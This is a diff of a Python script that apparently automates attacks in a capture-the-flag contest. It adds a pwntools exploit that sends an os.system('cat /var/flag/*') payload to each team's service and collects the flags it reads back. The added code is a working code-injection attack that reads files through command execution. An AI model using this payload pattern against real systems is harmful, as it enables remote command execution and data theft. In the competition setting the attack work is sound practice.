@@ -1,8 +1,21 @@
 import requests
 import multiprocessing
-from exploit_login import exploit
+from pwn import *
 
-TEAMS = 11
+context.log_level = "error"
+
+
+def exploit(team: str = 10):
+    try:
+        port = 12000
+        ip = "172.31.2.4"
+        r = remote(ip, port + team)
+        r.recvuntil(": ")
+        r.sendline("""os.system("cat /var/flag/*")""")
+        flag = r.recvuntil("}")
+        return flag.decode('utf8')
+    except (EOFError):
+        return ""
 
 
 def submit(flag: str):
@@ -22,7 +35,7 @@ def submit(flag: str):
 
 def main():
     with multiprocessing.Pool() as p:
-        flags = p.map(exploit, range(1, TEAMS+1))
+        flags = p.map(exploit, range(1, 12))
 
     flags = list(set(flags))
     print(type(flags[0]))
